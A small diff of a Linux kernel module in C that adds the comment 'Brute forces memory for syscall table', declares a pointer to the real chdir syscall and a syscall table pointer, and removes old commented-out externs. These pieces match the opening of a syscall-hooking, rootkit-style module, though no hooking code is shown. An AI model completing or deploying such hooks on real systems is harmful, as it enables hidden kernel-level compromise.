@@ -1,5 +1,4 @@
-//#define MODULE
-//#define __KERNEL__
+/* Brute forces memory for syscall table */
 
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -13,11 +12,8 @@
 #include <linux/init.h>
 #include <linux/highmem.h>
 #include <linux/sched.h>	
-//extern void* sys_call_table[];
-//extern gate_desc idt_table[];
 static struct file_operations chdir_ops;
 asmlinkage long (*real_chdir)(const char __user *filename);
-//void (*syscall_handler2)(void);
 
 void **syscall_table;
 asmlinkage long
